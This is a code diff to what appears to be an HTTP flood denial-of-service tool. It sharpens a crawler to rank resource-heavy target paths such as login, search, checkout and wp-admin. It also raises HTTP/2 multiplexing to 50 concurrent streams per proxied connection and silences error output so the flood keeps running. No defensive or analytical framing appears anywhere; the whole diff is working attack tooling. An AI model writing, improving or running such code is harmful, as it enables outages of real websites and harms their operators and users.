@@ -297,24 +297,26 @@ class Tools:
                 
             # Regex to find hrefs
             links = re.findall(r'href=["\'](/?.*?)["\']', html)
-            valid_paths = set() # [FIX] Use set for automatic dedup
+            valid_paths = set() 
             for link in links:
-                if link.startswith('http'):
-                    if p.netloc in link: # Internal full URL
-                        rel_path = link.replace(base, "")
-                        if rel_path.startswith('/'):
-                            valid_paths.add(rel_path)
-                elif link.startswith('/') and len(link) > 1: # Relative Path (not just /)
-                    # [FIX] Basic cleaning of found path
-                    clean_path = link.split('#')[0].split('?')[0] # Remove fragments for crawling
-                    if clean_path and clean_path.startswith('/'):
+                # [STRICT] Strictly exclude absolute URLs or links with domain markers
+                if link.startswith('http') or '://' in link or '//' in link:
+                    if p.netloc in link: # Still internal? Extract relative
+                        try:
+                            found_p = urlparse(link)
+                            if found_p.path:
+                                valid_paths.add(found_p.path)
+                        except: pass
+                elif link.startswith('/') and len(link) > 1:
+                    # Clean fragments and queries for the core path list
+                    clean_path = link.split('#')[0].split('?')[0]
+                    if clean_path and clean_path.startswith('/') and '.' not in clean_path.split('/')[-1]:
                          valid_paths.add(clean_path)
             
             # [PHASE 6] Heavy Path Prioritization
             heavy_keywords = ['search', 'login', 'checkout', 'cart', 'account', 'register', 'wp-admin', '?s=']
-            heavy_paths = [p for p in valid_paths if any(k in p.lower() for k in heavy_keywords)]
+            heavy_paths = [path for path in valid_paths if any(k in path.lower() for k in heavy_keywords)]
             
-            # Unique Only, with heavy paths prioritized
             return list(valid_paths | set(heavy_paths))
         except Exception:
             return []
@@ -1636,9 +1638,8 @@ class HttpFlood(Thread):
                     timeout=5.0 # Increased timeout for slow proxies
                 )
                 client = self._h2_client
-            # HTTP/2 allows multiple concurrent requests on 1 connection
-            # We use a smaller internal loop to report back more frequently
-            for _ in range(5): 
+            # [PHASE 15] High-Intensity Multiplexing (50 concurrent streams per connection)
+            for _ in range(50): 
                 with client.stream("GET", clean_target_url) as resp:
                     CONNECTIONS_SENT += 1
                     REQUESTS_SENT += 1
@@ -1658,20 +1659,20 @@ class HttpFlood(Thread):
                     if not IS_RECYCLING:
                         RECYCLE_EVENT.set()
         except Exception as e:
-            # [PHASE 14] Filter common noisy errors
-            noisy_errors = {"timed out", "handshake operation timed out", "read operation timed out", "Server disconnected"}
+            # [PHASE 15] Aggressive Silent Mode for common proxy noise
+            noisy_errors = {"timed out", "handshake", "read operation", "Server disconnected", "Malformed reply", "EOF occurred"}
             err_msg = str(e)
             is_noisy = any(ne.lower() in err_msg.lower() for ne in noisy_errors)
 
-            # [DEBUG] Report error for diagnosis (limited to non-noisy or early stage)
-            if int(REQUESTS_SENT) < 100 or not is_noisy:
-                 print(f"[{int(CONNECTIONS_SENT)}] [DEBUG ERROR] H2_FLOOD: {err_msg[:60]}... | Target: {clean_target_url}")
+            # [DEBUG] Only show initial errors or non-noisy core failures
+            if int(REQUESTS_SENT) < 50 or (not is_noisy and int(REQUESTS_SENT) < 200):
+                 print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] H2_FLOOD: {err_msg[:60]}...")
             
-            # [PHASE 14] Client Persistence: Only kill on core failures, not just timeouts
-            critical_failures = {"Malformed reply", "EOF occurred", "NoneType", "protocol error", "handshake failed"}
+            # [PHASE 14] Client Persistence: Only kill on core protocol/auth failures
+            critical_failures = {"NoneType", "protocol error", "socks", "proxy blocked"}
             is_critical = any(cf.lower() in err_msg.lower() for cf in critical_failures)
 
-            if is_critical or "socks" in err_msg.lower():
+            if is_critical:
                 if getattr(self, '_h2_client', None) is not None:
                     try: self._h2_client.close()
                     except: pass
